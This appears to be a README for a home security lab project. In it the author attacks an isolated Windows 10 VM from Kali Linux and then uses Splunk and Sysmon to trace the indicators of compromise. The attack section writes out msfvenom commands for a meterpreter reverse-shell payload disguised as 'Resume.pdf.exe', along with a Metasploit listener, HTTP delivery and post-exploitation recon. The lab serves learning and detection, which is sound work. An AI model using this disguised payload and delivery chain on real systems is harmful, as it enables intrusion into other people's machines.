# Detection Lab

## Project Overview

I built this home lab to create a virtual environment for practicing penetration testing and security monitoring techniques within a Security Information and Event Management (SIEM) system. The main objective of this project is to simulate an attack scenario and conduct log analysis to identify Indicators of Compromise (IoCs). This project was fabricated to strengthen my knowledge of security concepts by acquiring hands-on experience constructing and deploying malware, analyzing logs, and increase familiarity with commonly used industry tools.

**Project Objectives:**
- Create a simulated attack using a segmented Kali Linux virtual environment
- Practice penetration testing techniques with Metasploit
- Generate telemetry within a segmented Windows 10 virtual environment
- Conduct log analysis with Splunk and Sysmon

**Technical Skills Learned:**
- **Virtualization:** Manage and configure a virtual environment for Linux and Windows using Hyper-V
- **Network Security:** Implement an isolated virtual network
- **Penetration Testing:** Utilize Metasploit Framework for malware creation and deployment
- **SIEM Configuration:** Configure Splunk to ingest Sysmon logs and simulate a realistic SIEM system
- **Log Analysis:** Parse logs and conduct analysis to identify potential IoC

**Tools Used**
- Hyper-V
- Kali Linux & Windows 10 OS
- Metasploit Framework
- Splunk

## Lab Architecture

I fabricated and designed a segmented virtual network where the VMs could communicate with each other but remain isolated from the host network.
<img src="https://i.imgur.com/KKj42hs.png[/img]"/>
<img src="https://i.imgur.com/XLy7Ftz.png[/img]"/>
<img src="https://i.imgur.com/Rqj6jGq.png[/img]"/>

![Lab Architecture]([https://i.imgur.com/PLACEHOLDER.png]

### Network Topology Implemented
```
┌─────────────────┐    ┌─────────────────┐
│   Kali Linux    │    │   Windows 10    │
│   (Attacker)    │◄──►│    (Target)     │
│  10.10.10.1     │    │   10.10.10.2    │
└─────────────────┘    └─────────────────┘
        │                       │
        └───────────────────────┘
              Isolated Network
              (No Internet Access)
```

## Hardware & Software Used

### Host System Specifications
- **CPU:** Multi-core processor with virtualization support (Intel VT-x or AMD-V)
- **RAM:** Minimum 16GB (32GB recommended)
- **Storage:** 200GB+ free space for VMs
- **Hypervisor:** Microsoft Hyper-V

### Virtual Machines Deployed
| VM | OS | RAM | Storage | Purpose |
|----|----|-----|---------|---------|
| Attacker | Kali Linux | 4GB | 40GB | Penetration testing platform |
| Target | Windows 10 | 8GB | 60GB | Victim system with logging |

### Software Stack Implemented
- **Kali Linux:** Pre-installed penetration testing tools
- **Windows 10:** Target operating system
- **Splunk Enterprise:** Log collection and analysis
- **Sysmon:** Enhanced Windows event logging
- **Metasploit Framework:** Exploitation toolkit

## Virtual Machine Configuration

### Hyper-V Implementation
I configured Hyper-V with an isolated virtual switch to prevent lab traffic from reaching the production network.

![Hyper-V Setup](https://i.imgur.com/PLACEHOLDER.png)

### Kali Linux Attack Platform
I deployed Kali Linux with all penetration testing tools pre-configured.

**My Configuration:**
- Assigned IP: 10.10.10.1
- Enabled SSH for remote access
- Updated all tool repositories

```bash
# Commands I executed to update Kali Linux
sudo apt update && sudo apt upgrade -y

# Verified Metasploit installation
msfconsole --version
```

![Kali Linux Setup](https://i.imgur.com/PLACEHOLDER.png)

### Windows Target Preparation
I set up the Windows 10 machine with deliberate security weaknesses for realistic testing.

**Security Modifications I Made:**
- Disabled Windows Defender
- Opened RDP port 3389
- Installed Sysmon for enhanced logging
- Configured necessary firewall exceptions

![Windows VM Setup](https://i.imgur.com/PLACEHOLDER.png)

## Network Implementation

### IP Address Configuration
I assigned the following static IP addresses:
- **Kali Linux (Attacker):** 10.10.10.1/24
- **Windows (Target):** 10.10.10.2/24

### Network Isolation Strategy
I configured the VMs on an isolated virtual switch to ensure:
- No accidental exposure to production network
- Controlled environment without internet access
- Complete isolation from host system

![Network Configuration](https://i.imgur.com/PLACEHOLDER.png)

## Splunk Setup

### Splunk Enterprise Installation
I installed Splunk Enterprise on the Windows target machine for comprehensive log analysis.

### Sysmon Integration
I configured Splunk to ingest Sysmon logs for detailed process monitoring capabilities.

**inputs.conf Configuration I Implemented:**
```ini
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = false
index = endpoint
```

### Index Creation
I created a dedicated "endpoint" index specifically for organizing security event logs.

![Splunk Configuration](https://i.imgur.com/PLACEHOLDER.png)

## Attack Execution

### Target Reconnaissance
I performed network scanning to identify the target system and enumerate open ports.

```bash
# Nmap scan I conducted to identify target OS and open ports
nmap -A 10.10.10.2 -Pn
```

**My Reconnaissance Results:**
- Successfully identified Windows OS
- Discovered open RDP port (3389)
- Confirmed network connectivity between VMs

![Nmap Scan Results](https://i.imgur.com/PLACEHOLDER.png)

### Malware Creation
I generated a reverse shell payload using Metasploit's msfvenom tool.

```bash
# Commands I used to create the malware
# First, I listed available payloads
msfvenom -l payloads | grep windows

# Then generated the reverse TCP payload
msfvenom -p windows/x64/meterpreter_reverse_tcp \
         lhost=10.10.10.1 lport=4444 \
         -f exe -o Resume.pdf.exe
```

![Malware Generation](https://i.imgur.com/PLACEHOLDER.png)

### Listener Configuration
I set up a Metasploit listener to catch incoming connections from the target machine.

```bash
# My listener setup process
msfconsole

# Configured multi/handler
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set lhost 10.10.10.1
set lport 4444
exploit
```

![Metasploit Listener](https://i.imgur.com/PLACEHOLDER.png)

### Payload Delivery
I created a simple HTTP server to deliver the malware to the target system.

```bash
# Python HTTP server I created for payload delivery
python3 -m http.server 9999
```

### Target Compromise
I executed the complete attack sequence on the Windows target machine.

**My Attack Process:**
1. Navigated to attacker's web server (10.10.10.1:9999)
2. Downloaded and executed "Resume.pdf.exe"
3. Verified successful connection establishment

![Payload Execution](https://i.imgur.com/PLACEHOLDER.png)

### Post-Exploitation Activities
I demonstrated system access through the established reverse shell connection.

```bash
# Commands I executed on the compromised system
net user
net localgroup
ipconfig
```

![Post-Exploitation](https://i.imgur.com/PLACEHOLDER.png)

## Log Analysis Results

### Initial Investigation
I searched for suspicious network connections in Splunk to identify attack indicators.

```spl
index=endpoint [Kali VM IP Address]
```

**What I Discovered:**
- Connections to ports 3389 and 4444
- Suspicious external IP communications
- Clear evidence of unauthorized network activity

![Splunk Search Results](https://i.imgur.com/PLACEHOLDER.png)

### Malware Behavior Analysis
I investigated the malicious executable's behavior patterns in the logs.

```spl
index=endpoint "Resume.pdf.exe"
```

**My Analysis Results:**
- 15 security events generated by the malware
- Multiple process creation events (EventCode 1)
- Clear correlation between file execution and system activity

![Malware Events](https://i.imgur.com/PLACEHOLDER.png)

### Process Execution Tracking
I traced the malware's complete process execution chain using Splunk queries.

```spl
index=endpoint [process_guid]
| table _time, ParentImage, Image, CommandLine
```

**Key Discoveries I Made:**
- Malware successfully spawned cmd.exe (PID 1996)
- Executed reconnaissance commands as expected
- Established clear attack timeline and process relationships

![Process Analysis](https://i.imgur.com/PLACEHOLDER.png)

## Project Findings

### Attack Indicators I Identified
- **Network Anomalies:** Unexpected connections to port 4444
- **Process Anomalies:** Suspicious cmd.exe execution patterns
- **Command Execution:** System reconnaissance activities detected

## Project Insights

### What Worked Well
- **Effective Isolation:** VM network segmentation successfully prevented host exposure
- **Comprehensive Logging:** Sysmon provided detailed attack visibility and forensic data

### Technical Challenges I Overcame
- **Resource Management:** Successfully balanced VM performance with host system resources
- **Log Volume:** Effectively managed high-volume security event data
- **Network Timing:** Ensured proper communication between isolated VMs

## Future Work

### Advanced Capabilities I Plan to Implement
- **Active Directory Environment:** Multi-machine domain simulation
- **Automated Analysis:** Custom Splunk dashboards and alert development

### Skills I Want to Develop Further
- **Malware Development:** Custom payload creation techniques
- **Forensics Analysis:** Memory and disk forensics methodologies
